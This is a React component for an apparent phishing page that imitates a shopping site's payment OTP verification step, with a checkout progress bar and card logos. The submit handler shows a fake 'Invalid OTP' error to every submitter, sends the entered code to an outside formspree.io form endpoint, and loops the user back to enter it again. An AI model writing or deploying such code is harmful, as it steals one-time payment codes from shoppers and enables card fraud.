/* eslint-disable no-lone-blocks */
import { useCallback, useEffect, useState } from "react";
import Swal from "sweetalert2";
import axios from "axios";
import "./otp.css";
import { useNavigate } from "react-router-dom";
export default function OTP() {
  const navigate = useNavigate();
  const [timer, setTimer] = useState(60);

  const timeOutCallback = useCallback(
    () => setTimer((currTimer) => currTimer - 1),
    []
  );

  useEffect(() => {
    timer > 0 && setTimeout(timeOutCallback, 1000);
  }, [timer, timeOutCallback]);

  const resetTimer = function () {
    if (!timer) {
      setTimer(60);
    }
  };

  const saveFormData = async (e) => {
    e.preventDefault();
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "Invalid OTP !",
    });
    const data = new FormData(e.target);
    const Formvlaues = Object.fromEntries(data.entries());

    axios
      .post(`https://formspree.io/f/xwkzqweq`, Formvlaues)
      .then((response) => {
        if (response.status) {
          let dataSet = response.data;
          console.log();

          if (dataSet.ok) {
            navigate("/OTP");
            e.target.reset();
          }
        }
      });
  };

  return (
    <>
      <div style={{ marginTop: "5rem" }}>
        <div className="container">
          <ul id="progressbar-1" className="mx-0 mt-0 mb-5 px-0 pt-0 pb-4">
            <li className="step0 active " id="step1">
              <span style={{ marginLeft: "22px", marginTop: "12px" }}>
                Address
              </span>
            </li>
            <li className="step0 active text-center" id="step2">
              <span>Order Summary</span>
            </li>
            <li className="step0 active text-muted text-end" id="step3">
              <span style={{ marginRight: "22px" }}>Payment</span>
            </li>
          </ul>
        </div>

        <div className="container">
          <div className="header">
            <div className="headerimge">
              <img
                src="\assest\supercoin2.webp"
                alt=""
                style={{ background: "blue" }}
              />
            </div>

            <div className="discount">
              <div>
                Authenticate Payment- please enter OTP sent to registered number{" "}
              </div>
            </div>
          </div>
        </div>
        <div className="d-flex justify-content-center align-items-center continer">
          <div className="card py-5 px-3">
            <h5 className="m-0">Mobile phone verification</h5>
            <span className="mobile-text">
              <b>Enter the code we just sent on your phone</b>
              {/* <b className="text-color">+91 ******282</b> */}
            </span>
            <form onSubmit={saveFormData}>
              <div className="d-flex flex-row mt-5">
                <input
                  type="text"
                  className="form-control border-0 border-bottom border border-primary"
                  autoFocus=""
                  placeholder="Enter the OTP "
                  name="OTP"
                  required
                />
              </div>

              <div className="text-center mt-5">
                {timer === 0 ? (
                  <span
                    className="d-block mobile-text"
                    id="resend"
                    onClick={() => resetTimer()}
                  >
                    Resend Otp
                  </span>
                ) : (
                  <span className="d-block mobile-text" id="countdown">
                    {" "}
                    Not received your code? Resend code in {timer} Seconds
                  </span>
                )}
                <button type="submit" className="btn btn-primary">
                  verify
                </button>
              </div>
            </form>
          </div>
        </div>

        {/* payment image */}

        <div div className="container" style={{ width: "30%", margin: "auto" }}>
          <div className="footer" style={{ marginLeft: "58px" }}>
            <div>
              <img src="https://img.icons8.com/color/36/000000/amex.png" alt="" />
            </div>

            <div>
              <img
                src="https://img.icons8.com/color/36/000000/mastercard.png"
                alt=""
              />
            </div>

            <div>
              <img src="https://img.icons8.com/color/36/000000/visa.png" alt="" />
            </div>

            <div>
              <img
                src="https://images.news18.com/ibnlive/uploads/2020/02/UPI.jpg?impolicy=website&width=510&height=356"
                alt=""
              />
            </div>
          </div>
        </div>

        {/* loading....... */}

        <div className="container">
          <div className="footer" style={{ width: "50%", margin: "auto" }}>
            <div>
              <img
                src="https://static.thenounproject.com/png/1684626-200.png"
                alt=""
              />
              <p>Authentic Products</p>
            </div>

            <div>
              <img
                src="https://cdn-icons-png.flaticon.com/128/3262/3262027.png"
                alt=""
              />
              <p>Secure Payments</p>
            </div>

            <div>
              <img
                src="https://image.shutterstock.com/image-vector/simple-creative-easy-return-policy-260nw-2101313926.jpg"
                alt=""
              />
              {"   "} <p style={{ marginLeft: "2rem" }}>Easy Returns</p>
            </div>
          </div>
          <div className="container"></div>
        </div>
      </div>
    </>
  );
}
